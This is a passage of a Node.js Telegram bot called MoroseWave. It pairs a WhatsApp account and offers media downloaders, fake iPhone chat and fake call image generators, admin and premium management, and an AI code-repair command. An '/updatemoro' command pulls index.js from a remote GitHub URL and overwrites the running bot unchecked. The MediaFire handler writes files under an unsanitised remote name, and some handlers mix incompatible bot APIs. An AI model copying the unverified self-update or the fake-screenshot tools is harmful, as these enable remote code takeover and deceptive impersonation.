⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


» Information:
  Developer: @Luctadvorisme
  Version: 25.0.0
  Status: No Access
  
  Gagal menghubungkan ke server, Akses ditolak
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

// contoh validasi saat start
async function validateToken(token) {
    tokenValidated = await isAuthorizedToken(token);
}

(async () => {
    tokenValidated = await isAuthorizedToken(tokenBot);
})();

const bot = new Telegraf(tokenBot);

let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;
let pollData = null;
let pollKey = null;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'
const dbPath = "./database/ControlCommand.json";

function loadDB() {
if (!fs.existsSync(dbPath)) return {}
return JSON.parse(fs.readFileSync(dbPath))
}

function saveDB(data) {
fs.writeFileSync(dbPath, JSON.stringify(data, null, 2))
}

if (!fs.existsSync(dbPath)) {
  fs.writeFileSync(dbPath, JSON.stringify({ commands: {} }, null, 2));
}

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃ STATUS BOT : CONNECTED
⬡═―—―――――――――――――――――—═⬡
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<pre><code class="language-javascript">⟡━⟢ MoroseWave ⟣━⟡</code></pre>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀
░


  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

// Func Block/Unblock Command
const checkCommandEnabled = async (ctx, next) => {
  if (!ctx.message?.text) return next();

  const text = ctx.message.text.trim();

  if (!text.startsWith("/")) return next();

  // ambil command utama
  let cmd = text.split(" ")[0].toLowerCase();

  // hapus @botusername
  if (cmd.includes("@")) {
    cmd = cmd.split("@")[0];
  }

  const db = loadDB();
  const chatId = String(ctx.chat.id);

  // =========================
  // GLOBAL DISABLE COMMAND
  // =========================
  if (db.commands?.[cmd]?.disabled) {
    return ctx.reply(
      db.commands[cmd].reason ||
      "⛔ Command ini dimatikan."
    );
  }

  // =========================
  // BLOCK COMMAND CHAT
  // =========================
  const blocked =
    db.groupCmdBlock?.[chatId] || [];

  // normalize semua cmd
  const normalizedBlocked = blocked.map(c =>
    c.toLowerCase().split("@")[0]
  );

  if (normalizedBlocked.includes(cmd)) {
    return ctx.reply(
      "⛔ Command ini diblock di chat ini."
    );
  }

  return next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "MOROWAVE");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⟡━⟢ MoroseWave ⟣━⟡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
 ⟡━⟢ MoroseWave ⟣━⟡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

let adminUsers = loadJSON(adminFile);
let adminList = adminUsers;

const isAdmin = (userId) => {
    return adminUsers.includes(userId.toString());
};

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    userId = userId.toString();
    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveJSON(adminFile, adminUsers);
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    userId = userId.toString();
    const before = adminUsers.length;
    adminUsers = adminUsers.filter(id => id !== userId);
    saveJSON(adminFile, adminUsers);
    return adminUsers.length < before;
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./database/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

const adminPolls = {};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /addadmin\n2. /addadmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    addAdmin(userId);
    
    await ctx.reply(
        `👑 <b>Admin Berhasil Ditambahkan</b>\n• User: <code>${userId}</code>`,
        { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id }
    );
    
    try {
        await ctx.telegram.sendMessage(
            userId,
            `🎖️ <b>Anda sekarang Admin MoroseWave!</b>\nAkses: Semua command bot kecuali manage admin`,
            { parse_mode: "HTML" }
        );
    } catch (error) {}
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /deladmin\n2. /deladmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    if (userId === ownerID.toString()) {
        return ctx.reply("❌ ☇ Tidak bisa hapus owner");
    }
    
    const wasAdmin = removeAdmin(userId);

    if (wasAdmin) {
        await ctx.reply(`🗑️ <b>Admin Berhasil Dihapus</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    } else {
        await ctx.reply(`❌ <b>User bukan admin</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    }
});

bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args)
    return ctx.replyWithMarkdown(
      "🎵 *Download TikTok*\n\nContoh: `/tiktok https://vt.tiktok.com/xxx`\n_Support tanpa watermark & audio_"
    );

  if (!args.match(/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i))
    return ctx.reply("❌ Format link TikTok tidak valid!");

  try {
    const processing = await ctx.reply("⏳ _Mengunduh video TikTok..._", { parse_mode: "Markdown" });

    const encodedParams = new URLSearchParams();
    encodedParams.set("url", args);
    encodedParams.set("hd", "1");

    const { data } = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "TikTokBot/1.0",
      },
      timeout: 30000,
    });

    if (!data.data?.play) throw new Error("URL video tidak ditemukan");

    await ctx.deleteMessage(processing.message_id);
    await ctx.replyWithVideo({ url: data.data.play }, {
      caption: `🎵 *${data.data.title || "Video TikTok"}*\n🔗 ${args}\n\n✅ Tanpa watermark`,
      parse_mode: "Markdown",
    });

    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }
  } catch (err) {
    console.error("[TIKTOK ERROR]", err.message);
    ctx.reply(`❌ Gagal mengunduh: ${err.message}`);
  }
});

// Logging (biar gampang trace error)
function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}

bot.command("iqc", async (ctx) => {
  const fullText = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

  try {
    await ctx.sendChatAction("upload_photo");

    if (!fullText) {
      return ctx.reply(
        "🧩 Masukkan teks!\nContoh: /iqc Konichiwa|06:00|100"
      );
    }

    const parts = fullText.split("|");
    if (parts.length < 2) {
      return ctx.reply(
        "❗ Format salah!\n🍀 Contoh: /iqc Teks|WaktuChat|StatusBar"
      );
    }

    let [message, chatTime, statusBarTime] = parts.map((p) => p.trim());

    if (!statusBarTime) {
      const now = new Date();
      statusBarTime = `${String(now.getHours()).padStart(2, "0")}:${String(
        now.getMinutes()
      ).padStart(2, "0")}`;
    }

    if (message.length > 80) {
      return ctx.reply("🍂 Teks terlalu panjang! Maksimal 80 karakter.");
    }

    const url = `https://api.zenzxz.my.id/maker/fakechatiphone?text=${encodeURIComponent(
      message
    )}&chatime=${encodeURIComponent(chatTime)}&statusbartime=${encodeURIComponent(
      statusBarTime
    )}`;

    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal mengambil gambar dari API");

    const buffer = await response.buffer();

    const caption = `
 <b>Fake Chat iPhone Berhasil Dibuat!</b>

💬 <b>Pesan:</b> ${message}
⏰ <b>Waktu Chat:</b> ${chatTime}
📱 <b>Status Bar:</b> ${statusBarTime}
`;

    await ctx.replyWithPhoto({ source: buffer }, { caption, parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    await ctx.reply("🍂 Gagal membuat gambar. Coba lagi nanti.");
  }
});

bot.command("play", async (ctx) => {
   const text = ctx.message.text.split(" ").slice(1).join(" ")

   if (!text) {
      return ctx.reply("[$] Example: /play Payung Teduh")
   }

   try {
      await ctx.reply("⏳ Sedang mencari lagu di Spotify...")

      const { data } = await axios.get(`https://api.nexray.web.id/downloader/spotifyplay?q=${encodeURIComponent(text)}`)

      if (!data.status) {
         return ctx.reply("❌ Lagu tidak ditemukan!")
      }

      const res = data.result

      let caption = `❏ *SPOTIFY - PLAY* ❏

🏷 *Title:* ${res.title}
👤 *Artist:* ${res.artist}
🎧 *Album:* ${res.album}
⏳ *Duration:* ${res.duration}
🎬 *Popularity:* ${res.popularity}
🎉 *Release:* ${res.release_at}
📎 *URL:* ${res.url}`

      await ctx.replyWithPhoto(
         { url: res.thumbnail },
         { caption: caption, parse_mode: "Markdown" }
      )

      await ctx.replyWithAudio(
         { url: res.download_url },
         {
            title: res.title,
            performer: res.artist
         }
      )

   } catch (err) {
      console.log(err)
      ctx.reply("❌ Terjadi kesalahan saat mengambil data.")
   }
});
//MD MENU
bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command('mediafire', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args.length) return ctx.reply('Gunakan: /mediafire <url>');

    try {
      const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(args[0])}`);
      const { title, url } = data.data;

      const filePath = `/tmp/${title}`;
      const response = await axios.get(url, { responseType: 'arraybuffer' });
      fs.writeFileSync(filePath, response.data);

      const zip = new AdmZip();
      zip.addLocalFile(filePath);
      const zipPath = filePath + '.zip';
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({ source: zipPath }, {
        filename: path.basename(zipPath),
        caption: '📦 File berhasil di-zip dari MediaFire'
      });

      
      fs.unlinkSync(filePath);
      fs.unlinkSync(zipPath);

    } catch (err) {
      console.error('[MEDIAFIRE ERROR]', err);
      ctx.reply('Terjadi kesalahan saat membuat ZIP.');
    }
  });

bot.command("fixcode", async (ctx) => {
  try {
    const fileMessage = ctx.message.reply_to_message?.document || ctx.message.document;

    if (!fileMessage) {
      return ctx.reply(`📂 Kirim file .js dan reply dengan perintah /fixcode`);
    }

    const fileName = fileMessage.file_name || "unknown.js";
    if (!fileName.endsWith(".js")) {
      return ctx.reply("⚠️ File harus berformat .js bre!");
    }

    const fileUrl = await ctx.telegram.getFileLink(fileMessage.file_id);
    const response = await axios.get(fileUrl.href, { responseType: "arraybuffer" });
    const fileContent = response.data.toString("utf-8");

    await ctx.reply("🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return ctx.reply("❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${fileName}`;
    fs.writeFileSync(outputPath, fixedCode);

    await ctx.replyWithDocument({ source: outputPath, filename: `fixed_${fileName}` });
  } catch (err) {
    console.error("FixCode Error:", err);
    ctx.reply("⚠️ Terjadi kesalahan waktu memperbaiki kode.");
  }
});

const tiktokCache = new Map();

bot.command("tiktoksearch", async (ctx) => {
    const userId = ctx.from.id;

    try {
        const text = ctx.message.text.split(" ").slice(1).join(" ").trim();

        if (!text) {
            return ctx.reply(
                "🪧 Masukkan kata kunci!\nContoh: `/tiktoksearch epep`",
                { parse_mode: "Markdown", reply_to_message_id: ctx.message.message_id }
            );
        }

        const loadingMsg = await ctx.reply("⏳ SEARCHING VIDEO TIKTOK...");

        const searchUrl =
            `https://www.tikwm.com/api/feed/search?keywords=${encodeURIComponent(text)}&count=5`;

        const res = await axios.get(searchUrl, { timeout: 20000 });
        const data = res.data;

        const videos =
            data?.data?.videos ||
            data?.data?.list ||
            data?.data?.aweme_list ||
            data?.data ||
            [];

        if (!Array.isArray(videos) || videos.length === 0) {
            await ctx.deleteMessage(loadingMsg.message_id).catch(() => {});
            return ctx.reply("⚠️ Tidak ada hasil ditemukan.");
        }

        const topVideos = videos.slice(0, 5);
        const uniqueKey = Math.random().toString(36).slice(2, 10);

        tiktokCache.set(uniqueKey, {
            data: topVideos,
            expire: Date.now() + (10 * 60 * 1000)
        });

        await ctx.deleteMessage(loadingMsg.message_id).catch(() => {});

        const buttons = topVideos.map((v, i) =>
            [Markup.button.callback(
                `${i + 1}. ${(v.title || "Tanpa Judul").slice(0, 30)}`,
                `tt_${uniqueKey}_${i}_${userId}`
            )]
        );

        await ctx.reply(
            `📌 Ditemukan ${topVideos.length} hasil untuk:\n${text}\n\nPilih video:`,
            Markup.inlineKeyboard(buttons)
        );

    } catch (err) {
        console.error("❌ TikTok Search Error:", err.message);
        ctx.reply("⚠️ Gagal mengambil hasil pencarian TikTok.");
    }
});

/*
========================
CALLBACK BUTTON
========================
*/
bot.action(/tt_(.+)/, async (ctx) => {
    try {
        const data = ctx.match[1]; // ambil isi setelah tt_
        const [cacheKey, index, userId] = data.split("_");

        if (ctx.from.id != userId) {
            return ctx.answerCbQuery("⚠️ Ini bukan tombol kamu!", { show_alert: true });
        }

        const cachedObj = tiktokCache.get(cacheKey);
        if (!cachedObj) {
            return ctx.answerCbQuery("⚠️ Cache expired!", { show_alert: true });
        }

        const v = cachedObj.data[index];
        if (!v) {
            return ctx.answerCbQuery("⚠️ Data tidak valid!", { show_alert: true });
        }

        await ctx.answerCbQuery();

        await ctx.deleteMessage().catch(() => {});
        await ctx.reply("⏳ MENGUNDUH VIDEO...");

        const author =
            v.author?.unique_id ||
            v.author?.nickname ||
            v.user?.unique_id ||
            "unknown";

        const videoId =
            v.video_id ||
            v.id ||
            v.aweme_id ||
            v.short_id ||
            v.video?.id;

        if (!videoId) {
            return ctx.reply("⚠️ ID video tidak valid.");
        }

        const tiktokUrl = `https://www.tiktok.com/@${author}/video/${videoId}`;

        const res = await axios.post(
            "https://www.tikwm.com/api/",
            `url=${encodeURIComponent(tiktokUrl)}`,
            {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                timeout: 30000
            }
        );

        const result = res.data;

        if (!result || result.code !== 0 || !result.data) {
            throw new Error("Video tidak valid");
        }

        const vid = result.data;

        const videoUrl =
            vid.play ||
            vid.hdplay ||
            vid.wmplay ||
            vid.play_addr;

        if (!videoUrl) {
            return ctx.reply("⚠️ Link video tidak ditemukan.");
        }

        const caption =
`☀ MoroseWave Searching  
Video : *${(vid.title || "Video TikTok").slice(0, 80)}*  
Author : @${vid.author?.unique_id || "unknown"}  
Likes : ${vid.digg_count || 0}  
Comment : ${vid.comment_count || 0}  
[🌐 Lihat di TikTok](${tiktokUrl})`;

        try {
            await ctx.replyWithVideo(videoUrl, {
                caption,
                parse_mode: "Markdown"
            });
        } catch {
            const video = await axios.get(videoUrl, {
                responseType: "arraybuffer",
                timeout: 30000
            });

            await ctx.replyWithVideo(
                { source: Buffer.from(video.data) },
                {
                    caption,
                    parse_mode: "Markdown"
                }
            );
        }

        tiktokCache.delete(cacheKey);

    } catch (err) {
        console.error("❌ Callback Error:", err.message);
    }
});

bot.onText(/\/updatemoro/, async (msg) => {
    const chatId = msg.chat.id;

    const repoRaw = "https://raw.githubusercontent.com/anaksholehnih/update/main/index.js";

    bot.sendMessage(chatId, "⏳ Sedang mengecek update...");

    try {
        const { data } = await axios.get(repoRaw);

        if (!data) return bot.sendMessage(chatId, "❌ Update gagal: File kosong!");

        fs.writeFileSync("./index.js", data);

        bot.sendMessage(chatId, "✅ Update berhasil!\nSilakan restart bot.");

        process.exit(); // restart jika pakai PM2
    } catch (e) {
        console.log(e);
        bot.sendMessage(chatId, "❌ Update gagal. Pastikan repo dan file index.js tersedia.");
    }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Example\n/brat Reo Del Rey", { parse_mode: "Markdown" });

  try {
    // Kirim emoji reaksi manual
    await ctx.reply(" Membuat stiker...");

    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithSticker({ source: filePath });

    // Optional: hapus file setelah kirim
    fs.unlinkSync(filePath);

  } catch (err) {
    console.error("Error brat:", err.message);
